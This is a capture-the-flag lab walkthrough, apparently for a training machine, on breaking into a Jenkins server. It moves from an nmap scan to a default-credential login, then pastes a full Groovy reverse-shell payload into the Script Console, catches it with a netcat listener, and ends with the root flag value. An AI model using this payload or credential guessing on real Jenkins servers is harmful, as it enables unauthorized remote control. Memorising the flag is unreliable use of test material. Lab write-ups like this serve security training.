@@ -1,0 +1,107 @@
+Start with scan: sudo nmap -sC -sV (target ip)
+
+We find that only one port is open 8080/tcp that has Jetty running on it which is a java server
+
+From the output of the scan, we find a singular result of interest. Jetty version 9.4.39.v20210325 is running
+on an open TCP port 8080. Like any other HTTP server, we will need to use our browser to explore this
+service easily. Navigating to the IP address of the target through our URL search bar will yield an error, as we
+will need to specify the port the service is running on. Looking back at the scan, the service is not running on
+port 80, which is the one your browser would be expecting if you input the IP address of the target alone.
+However, if we specify the IP:PORT combination as shown below, we will meet the following result.
+
+http://(target_ip):8080/
+
+We are faced with a sign in page.
+
+The HTTP server seems to be running a Jenkins service.
+
+What is Jenkins:Jenkins is a free and open-source automation server. It helps automate the parts of
+software development related to building, testing, and deploying, facilitating
+continuous integration and delivery. It is a server-based system.
+
+We try to google the default credentials for jenkins.
+
+The credentials are admin:password.
+
+We try that and that didnt work.
+
+Instead of the username admin, we try root with the same password for admin.
+
+This works and we are signed into the dashboard.
+
+Our first clue that we get is the version number of the Jenkins which is displaied at the bottom right corner of the page. 
+
+We can find some good documentations about Jenkins exploits in these links: https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security, https://github.com/gquere/pwn_jenkins
+
+Both of them are talking about Groovy Script which is a scripting language used in Jenkins.
+
+We access the page where we can write and execute groovy script by: http:(target ip):8080/script
+
+Since it only executes the Groovy commands, we will need to create a payload in Groovy to execute the
+reverse shell connection. Specifically, we will make the remote server connect to us by specifying our IP
+address and the port that we will listen on for new connections. Through that listening port, the target will
+end up sending us a connection request, which our host will accept, forming an interactive shell with control
+over the target's backend system. In order to do that, we will need a specially crafted payload:
+
+String host="{your_IP}";
+int port=8000;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
+Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
+{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
+while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
+{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+But first we need to change the (your ip) with our own ip address: ifconfig. We will see our ip4 address under tun0: inet.
+
+Since the target is Linux-based, we are using `/bin/bash`.
+If the target was using Windows, it would have been `cmd.exe`.
+
+The rest of the script will instruct the target to create a cmd process which will initialize a connection
+request to the provided host and port (us, in this case). Our listener script will be running on the specified
+port and catch the connection request from the target, successfully forming a reverse shell between the
+target and attacker hosts. On our side, this will look like a new connection is received and that we can now
+type in the target host's terminal. This will not be visible on the target's side unless they are actively
+monitoring the network activity of their running processes or the outbound connections from their ports.
+Before running the command pasted in the Jenkins Script Console, we need to make sure our listener script
+is up and running on the same port as specified in the command above, for int port=8000 . To achieve
+this, we will use a tool called netcat or nc for short.
+
+netcat (often abbreviated to nc) is a computer networking utility for reading from and
+writing to network connections using TCP or UDP. The command is designed to be a
+dependable back-end that can be used directly or easily driven by other programs and
+scripts. At the same time, it is a feature-rich network debugging and investigation
+tool, since it can produce almost any kind of connection its user could need and has
+several built-in capabilities. Its list of features includes port scanning,
+transferring files, and port listening: as with any server, it can be used as a
+backdoor.
+
+We will run the command :nc -lvnp 8000 on our cmd to start a netcat listener on the specified port. This will make our attacker host ready to receive
+connections from the target.
+
+l : Listening mode.
+v : Verbose mode. Displays status messages in more detail.
+n : Numeric-only IP address. No hostname resolution. DNS is not being used.
+p : Port. Use to specify a particular port for listening.
+
+We now execute the script.
+
+We get back to our cmd window, we will see the line connect to [10.10.14.66] from (UNKNOWN) [10.129.127.212] 34276
+
+We can confirm that we are connected to the server by: whoami or id.
+
+We do a ls command. Then, we change directory to root: cd /root
+
+We do ls to find flag.txt.
+
+Finally, we do cat flag.txt
+
+flag:9cdfb439c7876e703e307864c9167a15
+
+//END
+
+
+
+
